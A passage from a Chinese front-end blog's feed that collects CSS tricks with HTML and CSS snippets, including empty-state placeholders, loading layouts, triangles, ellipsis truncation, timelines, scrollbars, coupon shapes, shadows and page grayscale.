class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dt</span>&gt;</span>姓名：<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dd</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dt</span>&gt;</span>性别：<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dt</span>&gt;</span>手机：<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dt</span>&gt;</span>邮箱：<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">dd</span><span class="selector-pseudo">:empty</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">'暂无'</span>;</span><br><span class="line">    <span class="attribute">color</span>: gray;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/css_empty2.png" alt="虚线框"></p><h3 id="数据为空提示"><a href="#数据为空提示" class="headerlink" title="数据为空提示"></a>数据为空提示</h3><p>搜索数据为空时之类的场景可以使用</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.cs-module</span><span class="selector-pseudo">:empty</span><span class="selector-pseudo">::before</span>&#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">'没有搜索结果'</span>；</span><br><span class="line">    display: block;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">color</span>: gray;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="only-child伪类"><a href="#only-child伪类" class="headerlink" title=":only-child伪类"></a>:only-child伪类</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 1. 只有加载图片 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cs-loading"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./loading.png"</span> <span class="attr">class</span>=<span class="string">"cs-loading-img"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 2. 只有加载文字 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cs-loading"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"cs-loading-p"</span>&gt;</span>正在加载中...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 3. 加载图片和加载文字同时存在 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cs-loading"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./loading.png"</span> <span class="attr">class</span>=<span class="string">"cs-loading-img"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"cs-loading-p"</span>&gt;</span>正在加载中...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.cs-loading</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">150px</span>;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="comment">/* 与截图无关，截图示意用 */</span></span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> dotted;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 图片和文字同时存在时在中间留点间距 */</span></span><br><span class="line"><span class="selector-class">.cs-loading-img</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">32px</span>; <span class="attribute">height</span>: <span class="number">32px</span>;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">45px</span>;</span><br><span class="line">    <span class="attribute">vertical-align</span>: bottom;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.cs-loading-p</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: .<span class="number">5em</span> <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">color</span>: gray;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 只有图片的时候居中绝对定位 */</span></span><br><span class="line"><span class="selector-class">.cs-loading-img</span><span class="selector-pseudo">:only-child</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>; <span class="attribute">right</span>: <span class="number">0</span>; <span class="attribute">top</span>: <span class="number">0</span>; <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">margin</span>: auto;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 只有文字的时候行号近似垂直居中 */</span></span><br><span class="line"><span class="selector-class">.cs-loading-p</span><span class="selector-pseudo">:only-child</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">150px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/css_onlychild.png" alt="onlychild"></p><h2 id="三角形"><a href="#三角形" class="headerlink" title="三角形"></a>三角形</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** 正三角 */</span></span><br><span class="line"><span class="selector-class">.triangle</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">border-style</span>: solid;</span><br><span class="line">  <span class="attribute">border-width</span>: <span class="number">0</span> <span class="number">25px</span> <span class="number">40px</span> <span class="number">25px</span>;</span><br><span class="line">  <span class="attribute">border-color</span>: transparent transparent <span class="built_in">rgb</span>(245, 129, 127) transparent;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/** 倒三角 */</span></span><br><span class="line"><span class="selector-class">.triangle</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">border-style</span>: solid;</span><br><span class="line">  <span class="attribute">border-width</span>: <span class="number">40px</span> <span class="number">25px</span> <span class="number">0</span> <span class="number">25px</span>;</span><br><span class="line">  <span class="attribute">border-color</span>:  <span class="built_in">rgb</span>(245, 129, 127) transparent transparent transparent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="虚线效果"><a href="#虚线效果" class="headerlink" title="虚线效果"></a>虚线效果</h2><p>具体的虚线的颜色和间距都可以通过repeating-linear-gradient生成的条纹背景去调整</p><p><img src="/images/css_dash1.png" alt="css"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.dotted-line</span>&#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> dashed transparent;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(white,white) padding-box, <span class="built_in">repeating-linear-gradient</span>(-45deg,#ccc 0, #ccc .25em,white 0,white .75em);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="文本超出省略号"><a href="#文本超出省略号" class="headerlink" title="文本超出省略号"></a>文本超出省略号</h2><h3 id="单行省略"><a href="#单行省略" class="headerlink" title="单行省略"></a>单行省略</h3><p><img src="/images/css_overflow1.png" alt="css"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.single-ellipsis</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">500px</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  <span class="attribute">text-overflow</span>: ellipsis;</span><br><span class="line">  <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="多行文本"><a href="#多行文本" class="headerlink" title="多行文本"></a>多行文本</h3><p><img src="/images/css_overflow2.png" alt="css"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.multiline-ellipsis</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: -webkit-box;</span><br><span class="line">  <span class="attribute">word-break</span>: break-all;</span><br><span class="line">  <span class="attribute">-webkit-box-orient</span>: vertical;</span><br><span class="line">  -webkit-line-clamp: 4; //需要显示的行数</span><br><span class="line">  <span class="selector-tag">overflow</span>: <span class="selector-tag">hidden</span>;</span><br><span class="line">  <span class="selector-tag">text-overflow</span>: <span class="selector-tag">ellipsis</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>扩展: -webkit-line-clamp 是一个 不规范的属性（unsupported WebKit property），它没有出现在 CSS 规范草案中。</p></blockquote><h2 id="时间轴"><a href="#时间轴" class="headerlink" title="时间轴"></a>时间轴</h2><p><img src="/images/css_timeline.png" alt="css"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"timeline-content"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">'(item, index) in timeLine'</span> <span class="attr">:key</span>=<span class="string">'index'</span> <span class="attr">class</span>=<span class="string">"time-line"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">:class</span>=<span class="string">"`state-$&#123;item.state&#125; state-icon`"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"timeline-title"</span>&gt;</span>&#123;&#123;item.title&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** 时间轴 */</span></span><br><span class="line"><span class="selector-class">.timeline-content</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  .time-line&#123;</span><br><span class="line">    <span class="selector-tag">padding</span>: 10<span class="selector-tag">px</span> 10<span class="selector-tag">px</span> 10<span class="selector-tag">px</span> 20<span class="selector-tag">px</span>;</span><br><span class="line">    <span class="selector-tag">position</span>: <span class="selector-tag">relative</span>;</span><br><span class="line">    &amp;<span class="selector-pseudo">::before</span>&#123;</span><br><span class="line">      <span class="attribute">content</span>: <span class="string">''</span>;</span><br><span class="line">      <span class="attribute">height</span>: <span class="number">1px</span>;</span><br><span class="line">      <span class="attribute">width</span>: <span class="built_in">calc</span>(100% - 34px);</span><br><span class="line">      <span class="attribute">background</span>: <span class="number">#EBEBEB</span>;</span><br><span class="line">      <span class="attribute">position</span>: absolute;</span><br><span class="line">      <span class="attribute">left</span>: <span class="number">24px</span>;</span><br><span class="line">      <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-class">.state-icon</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: -<span class="number">12px</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-class">.state-1</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">'https://static.daojia.com/assets/project/tosimple-pic/fen-zu-7-copy-6bei-fen_1589266208621.png'</span>) no-repeat;</span><br><span class="line">    <span class="attribute">background-size</span>: cover;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-class">.state-2</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">'https://static.daojia.com/assets/project/tosimple-pic/12_1589266226040.png'</span>) no-repeat;</span><br><span class="line">    <span class="attribute">background-size</span>: cover;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-class">.state-3</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">'https://static.daojia.com/assets/project/tosimple-pic/fen-zu-7-copy-3_1589266140087.png'</span>) no-repeat;</span><br><span class="line">    <span class="attribute">background-size</span>: cover;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>calc()函数 用来计算css属性的值。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/** 属性：calc（expression）*/</span><br><span class="line">宽度：calc（100％ - 34px）;</span><br></pre></td></tr></table></figure><h2 id="滚动条"><a href="#滚动条" class="headerlink" title="滚动条"></a>滚动条</h2><p><img src="/images/css_scrollbar.png" alt="css"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.scroll-container</span> &#123;</span><br><span class="line"> <span class="attribute">height</span>: <span class="number">250px</span>;</span><br><span class="line"> <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ddd</span>;</span><br><span class="line"> <span class="attribute">padding</span>: <span class="number">15px</span>;</span><br><span class="line"> <span class="attribute">overflow</span>: auto;</span><br><span class="line"> .row &#123;</span><br><span class="line">   <span class="selector-tag">margin</span>: 0;</span><br><span class="line">   <span class="selector-tag">line-height</span>: 1<span class="selector-class">.5</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> &amp;<span class="selector-pseudo">::-webkit-scrollbar</span> &#123;</span><br><span class="line">   <span class="attribute">width</span>: <span class="number">8px</span>;</span><br><span class="line">   <span class="attribute">background</span>: white;</span><br><span class="line"> &#125;</span><br><span class="line"> &amp;<span class="selector-pseudo">::-webkit-scrollbar-corner</span>, <span class="comment">/* 滚动条角落 */</span></span><br><span class="line"> &amp;<span class="selector-pseudo">::-webkit-scrollbar-thumb</span>,</span><br><span class="line"> &amp;<span class="selector-pseudo">::-webkit-scrollbar-track</span> &#123;</span><br><span class="line">   <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &amp;<span class="selector-pseudo">::-webkit-scrollbar-corner</span>,</span><br><span class="line"> &amp;<span class="selector-pseudo">::-webkit-scrollbar-track</span> &#123;</span><br><span class="line">   <span class="comment">/* 滚动条轨道 */</span></span><br><span class="line">   <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(180, 160, 120, 0.1);</span><br><span class="line">   <span class="attribute">box-shadow</span>: inset <span class="number">0</span> <span class="number">0</span> <span class="number">1px</span> <span class="built_in">rgba</span>(180, 160, 120, 0.5);</span><br><span class="line"> &#125;</span><br><span class="line"> &amp;<span class="selector-pseudo">::-webkit-scrollbar-thumb</span> &#123;</span><br><span class="line">   <span class="comment">/* 滚动条手柄 */</span></span><br><span class="line">   <span class="attribute">background-color</span>: <span class="number">#00adb5</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="卡卷效果"><a href="#卡卷效果" class="headerlink" title="卡卷效果"></a>卡卷效果</h2><p><img src="/images/css_coupon.png" alt="css"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.coupon</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">radial-gradient</span>(circle at right bottom, transparent 10px, #ffffff 0) top right /<span class="number">50%</span> <span class="number">51px</span> no-repeat,</span><br><span class="line">    <span class="built_in">radial-gradient</span>(circle at left bottom, transparent 10px, #ffffff 0) top left / <span class="number">50%</span> <span class="number">51px</span> no-repeat,</span><br><span class="line">    <span class="built_in">radial-gradient</span>(circle at right top, transparent 10px, #ffffff 0) bottom right / <span class="number">50%</span> <span class="number">51px</span> no-repeat,</span><br><span class="line">    <span class="built_in">radial-gradient</span>(circle at left top, transparent 10px, #ffffff 0) bottom left / <span class="number">50%</span> <span class="number">51px</span> no-repeat;</span><br><span class="line">  <span class="attribute">filter</span>: <span class="built_in">drop-shadow</span>(2px 2px 2px rgba(0,0,0,.2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="阴影效果"><a href="#阴影效果" class="headerlink" title="阴影效果"></a>阴影效果</h2><p><img src="/images/css_shadow.png" alt="css"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">// 三角形阴影</span><br><span class="line"><span class="selector-class">.shadow-triangle</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">border-style</span>: solid;</span><br><span class="line">    <span class="attribute">border-width</span>: <span class="number">0</span> <span class="number">50px</span> <span class="number">50px</span> <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">border-color</span>: transparent transparent <span class="built_in">rgb</span>(245, 129, 127) transparent;</span><br><span class="line">    <span class="attribute">filter</span>:<span class="built_in">drop-shadow</span>(10px 0px 10px  rgba(238, 125, 55,0.5));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 缺圆投影</span><br><span class="line"><span class="selector-class">.circle-square</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">radial-gradient</span>(circle at bottom right, transparent 20px, rgb(245, 129, 127) <span class="number">15px</span>);</span><br><span class="line">    <span class="attribute">filter</span>: <span class="built_in">drop-shadow</span>(2px 2px 2px rgba(238, 132, 66, 0.9));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 气泡阴影</span><br><span class="line"><span class="selector-class">.tip</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">30px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">30px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="built_in">rgb</span>(245, 129, 127);</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#fff</span>;</span><br><span class="line">    <span class="attribute">filter</span>: <span class="built_in">drop-shadow</span>(0px 2px 4px rgba(245, 129, 127, 0.9));</span><br><span class="line">    &amp;::before &#123;</span><br><span class="line">      <span class="selector-tag">content</span>: "";</span><br><span class="line">      <span class="selector-tag">width</span>: 0;</span><br><span class="line">      <span class="selector-tag">height</span>: 0;</span><br><span class="line">      <span class="selector-tag">border-style</span>: <span class="selector-tag">solid</span>;</span><br><span class="line">      <span class="selector-tag">border-width</span>: 0 10<span class="selector-tag">px</span> 10<span class="selector-tag">px</span> 10<span class="selector-tag">px</span>;</span><br><span class="line">      <span class="selector-tag">border-color</span>: <span class="selector-tag">transparent</span> <span class="selector-tag">transparent</span> <span class="selector-id">#fff</span> <span class="selector-tag">transparent</span>;</span><br><span class="line">      <span class="selector-tag">position</span>: <span class="selector-tag">absolute</span>;</span><br><span class="line">      <span class="selector-tag">top</span>: <span class="selector-tag">-10px</span>;</span><br><span class="line">      <span class="selector-tag">left</span>: 0;</span><br><span class="line">      <span class="selector-tag">right</span>: 0;</span><br><span class="line">      <span class="selector-tag">margin</span>: <span class="selector-tag">auto</span>;</span><br><span class="line">      <span class="selector-tag">z-index</span>: 2;</span><br><span class="line">    &#125;</span><br><span class="line">    &amp;<span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">      <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">      <span class="attribute">width</span>: <span class="number">0</span>;</span><br><span class="line">      <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">      <span class="attribute">border-style</span>: solid;</span><br><span class="line">      <span class="attribute">border-width</span>: <span class="number">0</span> <span class="number">10px</span> <span class="number">10px</span> <span class="number">10px</span>;</span><br><span class="line">      <span class="attribute">border-color</span>: transparent transparent <span class="built_in">rgb</span>(245, 129, 127) transparent;</span><br><span class="line">      <span class="attribute">position</span>: absolute;</span><br><span class="line">      <span class="attribute">top</span>: -<span class="number">11px</span>;</span><br><span class="line">      <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">      <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">      <span class="attribute">margin</span>: auto;</span><br><span class="line">      <span class="attribute">z-index</span>: <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="页面全部置灰"><a href="#页面全部置灰" class="headerlink" title="页面全部置灰"></a>页面全部置灰</h2><blockquote><p>特殊时期，需要网站整体置灰时使用。</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">html</span> &#123;</span><br><span class="line">  <span class="attribute">-webkit-filter</span>: <span class="built_in">grayscale</span>(100%);</span><br><span class="line">  <span class="attribute">-moz-filter</span>: <span class="built_in">grayscale</span>(100%);</span><br><span class="line">  <span class="attribute">-ms-filter</span>: <span class="built_in">grayscale</span>(100%);</span><br><span class="line">  <span class="attribute">-o-filter</span>: <span class="built_in">grayscale</span>(100%);</span><br><span class="line">  <span class="attribute">filter</span>: <span class="built_in">grayscale</span>(100%);</span><br><span class="line">  <span class="attribute">filter</span>: gray;</span><br><span class="line">  <span class="attribute">filter</span>: progid:DXImageTransform.Microsoft.<span class="built_in">BasicImage</span>(grayscale=1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;汇总开发中可使用的好用又简单的css技巧。&lt;br&gt;
    
    </summary>
    
    
      <category term="css" scheme="https://luckyp.top/tags/css/"/>
    
      <category term="技巧" scheme="https://luckyp.top/tags/%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>vue源码学习</title>
    <link href="https://luckyp.top/vue%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/"/>
    <id>https://luckyp.top/vue源码学习/</id>
    <published>2020-03-01T07:02:45.000Z</published>
    <updated>2020-03-01T07:02:45.000Z</updated>
    
